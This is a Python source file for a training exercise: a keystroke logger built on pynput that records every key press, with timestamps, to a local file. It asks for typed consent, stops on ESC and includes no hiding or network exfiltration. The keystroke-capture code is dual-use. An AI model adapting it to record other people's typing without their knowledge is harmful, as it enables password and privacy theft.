#!/usr/bin/env python3
# simple keylogger - prodigy task 4
# for learning only, only on my own machine. saves keys to a local file.

import argparse
import os
import sys
from datetime import datetime

try:
    from brand import boot
except Exception:
    def boot(*a, **k):
        pass

LOG = "keystrokes.log"

MSG = """
KEYLOGGER - Prodigy Task 4 (school exercise, local only)
This saves what you type into a file on THIS computer: {logfile}
Rules:
  - only run this on your own computer
  - don't log other people, that's illegal
  - press ESC to stop, delete the log when done
Type YES to agree and start, anything else quits.
"""


def get_args(argv=None):
    p = argparse.ArgumentParser(description="simple local keylogger for practice")
    p.add_argument("--output", default=LOG)
    return p.parse_args(argv)


def ask(logfile):
    print(MSG.format(logfile=logfile))
    try:
        ans = input("type YES to continue: ").strip()
    except (EOFError, KeyboardInterrupt):
        print("\nquit, nothing logged")
        sys.exit(1)
    if ans != "YES":
        print("quit, nothing logged")
        sys.exit(1)
    print("logging... press ESC to stop\n")


def key_to_text(key, Key):
    if isinstance(key, Key):
        names = {
            Key.space: "[SPACE]",
            Key.enter: "[ENTER]",
            Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.esc: "[ESC]",
            Key.shift: "[SHIFT]",
            Key.shift_l: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.ctrl_l: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
        }
        if key in names:
            return names[key]
        try:
            return "[" + key.name.upper() + "]"
        except Exception:
            return "[KEY]"
    try:
        c = key.char
    except AttributeError:
        c = None
    if c is None:
        return "[" + str(key) + "]"
    return c


def main(argv=None):
    a = get_args(argv)
    path = os.path.abspath(a.output)

    boot("Keylogger", "CS-04", "local keystroke logger - consent required")
    ask(path)

    try:
        from pynput import keyboard
    except ImportError:
        print("need pynput: pip install pynput", file=sys.stderr)
        return 2
    except Exception as e:
        print("cant load keyboard (" + str(e) + "). need a desktop session.", file=sys.stderr)
        return 3

    try:
        f = open(path, "a", encoding="utf-8")
    except OSError as e:
        print("cant open log file: " + str(e), file=sys.stderr)
        return 4

    with f:
        f.write("--- started: " + datetime.now().isoformat(timespec="seconds") + " ---\n")
        f.flush()
        print("saving to: " + path)

        def on_press(key):
            ts = datetime.now().isoformat(timespec="seconds", sep=" ")
            try:
                t = key_to_text(key, keyboard.Key)
            except Exception:
                t = "[?]"
            f.write("[" + ts + "] " + t + "\n")
            f.flush()
            if key == keyboard.Key.esc:
                return False

        try:
            with keyboard.Listener(on_press=on_press) as lst:
                lst.join()
        except Exception as e:
            print("\ncant start listener (" + str(e) + "). on headless/ssh this is normal.", file=sys.stderr)
            return 5

        f.write("--- stopped: " + datetime.now().isoformat(timespec="seconds") + " ---\n")

    print("\nstopped. log at: " + path)
    print("remember to delete it when done")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
